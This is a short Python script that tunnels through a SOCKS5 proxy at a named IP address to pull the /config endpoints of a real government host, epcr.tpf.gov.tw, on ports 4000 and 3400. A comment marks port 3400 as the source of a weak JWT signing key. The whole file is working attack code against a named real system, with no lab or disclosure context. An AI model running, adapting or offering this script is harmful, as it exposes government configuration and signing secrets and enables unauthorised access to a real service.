#!/usr/bin/env python3
"""Full epcr /config dump from port 4000 (and 3400 if reachable)."""
import socket, struct, sys

PROXY = ("202.160.76.157", 11082)
DEST_HOST = "epcr.tpf.gov.tw"

def fetch(port, path, timeout=25):
    s = socket.create_connection(PROXY, timeout=15)
    s.sendall(b"\x05\x01\x00")
    hl = s.recv(4)
    hb = DEST_HOST.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + struct.pack(">H", port))
    s.settimeout(timeout)
    rep = b""
    while len(rep) < 4:
        c = s.recv(16)
        if not c: break
        rep += c
    if len(rep) < 2 or rep[1] != 0:
        return f"[port {port} connect FAILED status={rep[1] if len(rep)>1 else '?'}]"
    req = f"GET {path} HTTP/1.1\r\nHost: {DEST_HOST}:{port}\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n"
    s.sendall(req.encode())
    buf = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            buf += d
            if len(buf) > 500000: break
    except socket.timeout:
        buf += b"\n[timeout]"
    s.close()
    return buf.decode(errors="replace")

print("=== 4000 /config FULL ===")
out = fetch(4000, "/config")
if "\r\n\r\n" in out:
    head, body = out.split("\r\n\r\n", 1)
    print(head)
    print("---BODY---")
    print(body)
else:
    print(out[:3000])

print("\n=== 3400 /config (JWT weak key source) ===")
out2 = fetch(3400, "/config")
if "\r\n\r\n" in out2:
    head, body = out2.split("\r\n\r\n", 1)
    print(head)
    print("---BODY (first 3000)---")
    print(body[:3000])
else:
    print(out2[:2000])
